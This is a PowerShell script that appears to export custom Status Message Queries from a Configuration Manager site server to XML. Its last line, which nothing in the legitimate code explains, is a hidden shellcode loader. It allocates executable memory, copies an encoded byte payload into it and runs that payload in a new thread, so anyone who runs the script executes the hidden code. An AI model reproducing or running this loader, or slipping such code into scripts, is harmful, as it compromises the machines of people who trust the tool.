
[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, ParameterSetName="Multiple", HelpMessage="Site server where the SMS Provider is installed")]
    [parameter(ParameterSetName="Single")]
    [ValidateScript({Test-Connection -ComputerName $_ -Count 1 -Quiet})]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer,
    [parameter(Mandatory=$false, ParameterSetName="Single", HelpMessage="Name of a Status Message Query")]
    [ValidateNotNullOrEmpty()]
    [string]$Name,
    [parameter(Mandatory=$true, ParameterSetName="Multiple", HelpMessage="Specify a valid path to where the XML file containing the Status Message Queries will be stored")]
    [parameter(ParameterSetName="Single")]
    [ValidateNotNullOrEmpty()]
    [ValidatePattern("^[A-Za-z]{1}:\\\w+\\\w+")]
    [ValidateScript({
        if ((Split-Path -Path $_ -Leaf).IndexOfAny([IO.Path]::GetInvalidFileNameChars()) -ge 0) {
            Throw "$(Split-Path -Path $_ -Leaf) contains invalid characters"
        }
        else {
            if ([System.IO.Path]::GetExtension((Split-Path -Path $_ -Leaf)) -like ".xml") {
                return $true
            }
            else {
                Throw "$(Split-Path -Path $_ -Leaf) contains unsupported file extension. Supported extensions are '.xml'"
            }
        }
    })]
    [string]$Path,
    [parameter(Mandatory=$false, ParameterSetName="Multiple", HelpMessage="Export all custom Status Message Queries")]
    [switch]$Recurse,
    [parameter(Mandatory=$false, ParameterSetName="Multiple", HelpMessage="Will overwrite any existing XML files specified in the Path parameter")]
    [parameter(ParameterSetName="Single")]
    [switch]$Force
)
Begin {
    
    try {
        Write-Verbose "Determining SiteCode for Site Server: '$($SiteServer)'"
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
                Write-Debug "SiteCode: $($SiteCode)"
            }
        }
    }
    catch [Exception] {
        Throw "Unable to determine SiteCode"
    }
    
    if ([System.IO.File]::Exists($Path)) {
        if (-not($PSBoundParameters["Force"])) {
            Throw "Error creating '$($Path)', file already exists"
        }
    }
}
Process {
    
    $XMLData = New-Object -TypeName System.Xml.XmlDocument
    $XMLRoot = $XMLData.CreateElement("ConfigurationManager")
    $XMLData.AppendChild($XMLRoot) | Out-Null
    $XMLRoot.SetAttribute("Description", "Export of Status Message Queries")
    
    try {
        if ($PSBoundParameters["Recurse"]) {
            Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
            $StatusMessageQueries = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Query -ComputerName $SiteServer -Filter "(QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')" -ErrorAction Stop
            $WmiFilter = "(QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
        }
        elseif ($PSBoundParameters["Name"]) {
            if (($Name.StartsWith("*")) -and ($Name.EndsWith("*"))) {
                Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '%$($Name.Replace('*',''))%') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
                $WmiFilter = "(Name like '%$($Name)%') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
            }
            elseif ($Name.StartsWith("*")) {
                Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '%$($Name.Replace('*',''))') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
                $WmiFilter = "(Name like '%$($Name)') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
            }
            elseif ($Name.EndsWith("*")) {
                Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '$($Name.Replace('*',''))%') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
                $WmiFilter = "(Name like '$($Name)%') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
            }
            else {
                Write-Verbose -Message "Query: SELECT * FROM SMS_Query WHERE (Name like '$($Name)') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
                $WmiFilter = "(Name like '$($Name)') AND (QueryID not like 'SMS%') AND (TargetClassName like 'SMS_StatusMessage')"
            }
            if ($Name -match "\*") {
                $Name = $Name.Replace("*","")
                $WmiFilter = $WmiFilter.Replace("*","")
            }
        }
        $StatusMessageQueries = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class SMS_Query -ComputerName $SiteServer -Filter $WmiFilter -ErrorAction Stop
        $QueryResultCount = ($StatusMessageQueries | Measure-Object).Count
        if ($QueryResultCount -gt 1) {
            Write-Verbose -Message "Query returned $($QueryResultCount) results"
        }
        else {
            Write-Verbose -Message "Query returned $($QueryResultCount) result"
        }
        if ($StatusMessageQueries -ne $null) {
            foreach ($StatusMessageQuery in $StatusMessageQueries) {
                $XMLQuery = $XMLData.CreateElement("Query")
                $XMLData.ConfigurationManager.AppendChild($XMLQuery) | Out-Null
                $XMLQueryName = $XMLData.CreateElement("Name")
                $XMLQueryName.InnerText = ($StatusMessageQuery | Select-Object -ExpandProperty Name)
                $XMLQueryExpression = $XMLData.CreateElement("Expression")
                $XMLQueryExpression.InnerText = ($StatusMessageQuery | Select-Object -ExpandProperty Expression)
                $XMLQueryLimitToCollectionID = $XMLData.CreateElement("LimitToCollectionID")
                $XMLQueryLimitToCollectionID.InnerText = ($StatusMessageQuery | Select-Object -ExpandProperty LimitToCollectionID)
                $XMLQueryTargetClassName = $XMLData.CreateElement("TargetClassName")
                $XMLQueryTargetClassName.InnerText = ($StatusMessageQuery | Select-Object -ExpandProperty TargetClassName)
                $XMLQuery.AppendChild($XMLQueryName) | Out-Null
                $XMLQuery.AppendChild($XMLQueryExpression) | Out-Null
                $XMLQuery.AppendChild($XMLQueryLimitToCollectionID) | Out-Null
                $XMLQuery.AppendChild($XMLQueryTargetClassName) | Out-Null
                Write-Verbose -Message "Exported '$($XMLQueryName.InnerText)' to '$($Path)'"
            }
        }
        else {
            Write-Verbose -Message "Query did not return any objects"
        }
    }
    catch [Exception] {
        Throw $_.Exception.Message
    }
}
End {
    
    $XMLData.Save($Path) | Out-Null
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xe8,0xd1,0xdc,0x30,0xdb,0xdb,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x47,0x31,0x53,0x13,0x83,0xeb,0xfc,0x03,0x53,0xe7,0x33,0x29,0xcc,0x1f,0x31,0xd2,0x2d,0xdf,0x56,0x5a,0xc8,0xee,0x56,0x38,0x98,0x40,0x67,0x4a,0xcc,0x6c,0x0c,0x1e,0xe5,0xe7,0x60,0xb7,0x0a,0x40,0xce,0xe1,0x25,0x51,0x63,0xd1,0x24,0xd1,0x7e,0x06,0x87,0xe8,0xb0,0x5b,0xc6,0x2d,0xac,0x96,0x9a,0xe6,0xba,0x05,0x0b,0x83,0xf7,0x95,0xa0,0xdf,0x16,0x9e,0x55,0x97,0x19,0x8f,0xcb,0xac,0x43,0x0f,0xed,0x61,0xf8,0x06,0xf5,0x66,0xc5,0xd1,0x8e,0x5c,0xb1,0xe3,0x46,0xad,0x3a,0x4f,0xa7,0x02,0xc9,0x91,0xef,0xa4,0x32,0xe4,0x19,0xd7,0xcf,0xff,0xdd,0xaa,0x0b,0x75,0xc6,0x0c,0xdf,0x2d,0x22,0xad,0x0c,0xab,0xa1,0xa1,0xf9,0xbf,0xee,0xa5,0xfc,0x6c,0x85,0xd1,0x75,0x93,0x4a,0x50,0xcd,0xb0,0x4e,0x39,0x95,0xd9,0xd7,0xe7,0x78,0xe5,0x08,0x48,0x24,0x43,0x42,0x64,0x31,0xfe,0x09,0xe0,0xf6,0x33,0xb2,0xf0,0x90,0x44,0xc1,0xc2,0x3f,0xff,0x4d,0x6e,0xb7,0xd9,0x8a,0x91,0xe2,0x9e,0x05,0x6c,0x0d,0xdf,0x0c,0xaa,0x59,0x8f,0x26,0x1b,0xe2,0x44,0xb7,0xa4,0x37,0xf0,0xb2,0x32,0x78,0xad,0xbc,0xcd,0x10,0xac,0xbe,0xc0,0xbc,0x39,0x58,0xb2,0x6c,0x6a,0xf5,0x72,0xdd,0xca,0xa5,0x1a,0x37,0xc5,0x9a,0x3a,0x38,0x0f,0xb3,0xd0,0xd7,0xe6,0xeb,0x4c,0x41,0xa3,0x60,0xed,0x8e,0x79,0x0d,0x2d,0x04,0x8e,0xf1,0xe3,0xed,0xfb,0xe1,0x93,0x1d,0xb6,0x58,0x35,0x21,0x6c,0xf6,0xb9,0xb7,0x8b,0x51,0xee,0x2f,0x96,0x84,0xd8,0xef,0x69,0xe3,0x53,0x39,0xfc,0x4c,0x0b,0x46,0x10,0x4d,0xcb,0x10,0x7a,0x4d,0xa3,0xc4,0xde,0x1e,0xd6,0x0a,0xcb,0x32,0x4b,0x9f,0xf4,0x62,0x38,0x08,0x9d,0x88,0x67,0x7e,0x02,0x72,0x42,0x7e,0x7e,0xa5,0xaa,0xf4,0x6e,0x75;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

